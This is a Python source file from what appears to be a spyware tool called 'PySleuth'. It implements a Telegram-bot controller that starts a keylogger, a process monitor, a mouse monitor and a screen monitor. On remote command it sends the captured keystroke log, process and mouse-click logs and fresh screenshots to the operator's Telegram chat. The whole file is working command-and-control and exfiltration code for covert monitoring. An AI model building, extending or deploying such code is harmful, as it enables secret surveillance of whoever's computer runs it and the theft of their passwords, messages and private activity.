import os
import time
from telepot.exception import TelegramError

from .._base import BaseController
from ...core.telegram import TelegramWrapper
from ...core.components.screen import saveScreenShot
from ...core.signal import Signal
from ...core import output
from . import _messages as msgs

logger = output.Loggers.getMaster(__name__)


class TelegramController(BaseController):
    SIG_shutdown = Signal()

    def __init__(self, master):
        super(TelegramController, self).__init__()

        self.master = master
        self.callbacks = dict()

        token = os.getenv("TELEGRAM_TOKEN")
        chatID = int(os.getenv("TELEGRAM_ID"))

        try:
            self.bot = TelegramWrapper(token, chatID)
        except AssertionError:
            logger.critical("Bot validation error! ", exc_info=True)
            quit(1)
        except:
            logger.critical("Uncaught exception",  exc_info=True)
            quit(1)

        self.__pause = 1

        self.connectSlots()
        self.initCallbacks()

    @property
    def pause(self):
        return self.__pause

    def setPause(self, pause: int):
        try:
            assert isinstance(pause, int) and pause > 0 and pause != None
        except AssertionError:
            logger.warn(
                f"Expected unsigned int, got: {pause}, setting to 1 second", exc_info=True)
            pause = 1
        self.__pause = pause

    def startWorker(self):
        self.bot.sendText("PySleuth is waiting for startup signal")
        self._sendHelpText()
        logger.info("Waiting for signal ...")

        while self.master.RUNNING:
            self.bot.spinOnce()
            time.sleep(self.pause)

    def connectSlots(self):
        self.bot.SIG_msgReceived.connect(self, "_handleMessage")

    def initCallbacks(self):
        self.callbacks = {
            "start": self._onStartProgram,
            "stop": self._onStopProgram,
            "help": self._sendHelpText,
            "log keys": self._onLogKeys,
            "log proc": self._onLogProc,
            "log mouse": self._onLogMouse,
            "send ss": self._onSendScreenshot
        }

    def _handleMessage(self, message: str):
        try:
            logger.info(f"Got command: `{message}` from admin")
            self.callbacks[message]()
        except KeyError:
            self._onUnknownCommand()
        except TelegramError:
            logger.error("Error in processing command", exc_info=True)
            self.bot.sendText("Could not process command")
            self.bot.sendText(msgs.CMDERROR, parse_mode="Markdown")

    # -----------------------------------------------------------------------
    # Callbacks
    # -----------------------------------------------------------------------
    def _sendHelpText(self):
        self.bot.sendText(msgs.HELP, parse_mode="Markdown")

    def _onStartProgram(self):
        try:
            assert not self.master.ctrls.keyloggerctrl.isWorkerActive
            assert not self.master.ctrls.procMntrCtrl.isWorkerActive
            assert not self.master.ctrls.mouseMntrCtrl.isWorkerActive
            assert not self.master.ctrls.screenMntrCtrl.isWorkerActive
        except AssertionError:
            self.bot.sendText("Workers are active")
            logger.warn("Attempt to start active threads !", exc_info=True)
        else:
            self.master.ctrls.keyloggerctrl.startWorker()
            self.master.ctrls.procMntrCtrl.startWorker()
            self.master.ctrls.mouseMntrCtrl.startWorker()
            self.master.ctrls.screenMntrCtrl.startWorker()
            self.bot.sendText("PySleuth is up and running!")
            self.master.RUNNING = True
            logger.info("PySleuth active")

    def _onStopProgram(self):
        msg = "Shutting down"
        self.bot.sendText(msg)
        self.SIG_shutdown.emit()
        logger.info("Closing connection")

    def _onLogKeys(self):
        file = output.Path().getRootDir() / "keys.log"
        self.bot.sendDocument(file)
        logger.info("Sending document: keys.log")

    def _onLogProc(self):
        file = output.Path().getRootDir() / "proc.log"
        self.bot.sendDocument(file)
        logger.info("Sending document: proc.log")

    def _onLogMouse(self):
        file = output.Path().getRootDir() / "mouse/clicks.log"
        self.bot.sendDocument(file)
        logger.info("Sending document: mouse/clicks.log")

    def _onUnknownCommand(self):
        self.bot.sendText("I didn't get you master :(")
        self._sendHelpText()
        logger.warn("Got unknown command")

    def _onSendScreenshot(self):
        file = output.Path().getRootDir() / "latestss.jpg"
        saveScreenShot(file)
        self.bot.sendPhoto(file)
